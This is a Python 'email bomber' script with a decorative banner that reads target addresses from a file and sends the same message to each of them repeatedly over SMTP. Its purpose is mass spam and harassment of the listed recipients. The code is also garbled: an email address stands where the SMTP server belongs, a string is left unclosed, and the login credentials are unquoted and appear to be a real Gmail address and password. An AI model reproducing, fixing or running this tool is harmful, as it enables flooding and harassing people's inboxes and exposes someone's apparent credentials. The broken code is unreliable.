import smtplib
import time
print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By @everydaycodings                  \033[1;m")
print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|              Made with code             \033[1;m")
print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

files = open('email.txt', 'r')
bomb_emails = files.readlines()


email = input("safiafgan55@gmail.com:")
password = input("IAMMUSTAFA0:")
message = input("HELLO BABY GIRL:")
message_relode = int(input("1?:"))


for bomb_email in bomb_emails:
    for x in range(0, message_relode):
        mail = smtplib.SMTP('safiafgan13@gmail.com,587)
        mail.ehlo()
        mail.starttls()
        mail.login(safiafgan55@gmail.com,Mustafa.313)
        mail.sendmail(email,bomb_email,message)
        print("message sent to {}".format(bomb_email))
    time.sleep(1)

mail.close()
files.close()

print("Done")
Done
